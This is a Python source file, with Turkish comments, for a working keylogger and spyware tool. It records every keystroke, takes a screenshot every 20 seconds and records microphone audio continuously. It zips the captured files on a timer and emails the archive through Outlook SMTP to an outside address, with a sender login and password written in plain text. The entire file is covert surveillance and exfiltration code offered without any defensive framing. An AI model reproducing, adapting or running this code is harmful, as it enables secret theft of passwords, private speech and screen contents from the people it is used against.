from pynput.keyboard import Listener
import threading
import time
import pyautogui
import os
from pynput.keyboard import Key, Listener
import wave
import pyaudio
import smtplib
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import zipfile
import glob


if os.path.exists("C:\\Videos\\"):
    zipfile.ZipFile("C:\\Videos\\arsiv.zip", "w")
    pass
else:
    os.mkdir('C:\\Videos')   # yeni dizin oluşturmamız için
    os.mkdir('C:\\Videos\\Register')
    zipfile.ZipFile("C:\\Videos\\arsiv.zip", "w")
    pass

def keyboard():
    def write_to_file(key):
        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
        with open("C:\\Picture\\Default\\logs.txt", 'a') as f:
            f.write(letter)

    with Listener(on_press=write_to_file) as l:
        l.join()

def screenshot():
    threading.Timer(20.0, screenshot).start()
    ss = pyautogui.screenshot()
    file_name = str(time.time_ns()) + ".jpg"
    folder_name = os.path.join('C:\\Videos\\Register', file_name) #dizin
    ss.save(folder_name)

def microphone():
    while True:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 15
        WAVE_OUTPUT_FILENAME = "C:\\Videos\\Register\\" + str(time.time_ns()) + ".wav"

        p = pyaudio.PyAudio()

        stream = p.open(format=pyaudio.paInt16, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

        print("* recording")

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        print("* done recording")

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        time.sleep(2)

def zip():
    arsivlenecekDosyalar=[]
    threading.Timer(180.0, zip).start()
    for belge in glob.iglob("C:\\Videos\\Register\\**/*", recursive=True):
        arsivlenecekDosyalar.append(belge)
    with zipfile.ZipFile("C:\\Videos\\arsiv.zip", "w") as arsiv:
        for dosya in arsivlenecekDosyalar:
            arsiv.write(dosya)

def mail():
    #mailbilgileri
    threading.Timer(200.0, mail).start()
    yoladres = "kaanyilmazz44@outlook.com"
    aliciadres = "bsgproje23@outlook.com"
    msg = MIMEMultipart()
    msg['from'] = yoladres
    msg['to'] = aliciadres
    msg['Konu'] = "Bazı Önemli formlar"
    #keylogger_dosyasıatma_mail
    konu = "Aşagida ekte bulabilirsin: "
    msg.attach(MIMEText(konu, 'plain'))
    dosyaismi = "arsiv.zip"
    attachment = open("C:\\Videos\\arsiv.zip", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % dosyaismi)
    msg.attach(part)
    server = smtplib.SMTP('smtp.outlook.com', 587)
    server.starttls()
    server.login(yoladres,"malatyalikaan44**")
    text = msg.as_string()
    server.sendmail(yoladres, aliciadres, text)
    server.quit()




if __name__ == '__main__':
    t1 = threading.Thread(target=keyboard)
    t2 = threading.Thread(target=microphone)
    t3 = threading.Thread(target=screenshot)
    t4 = threading.Thread(target=zip)
    t5 = threading.Thread(target=mail)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

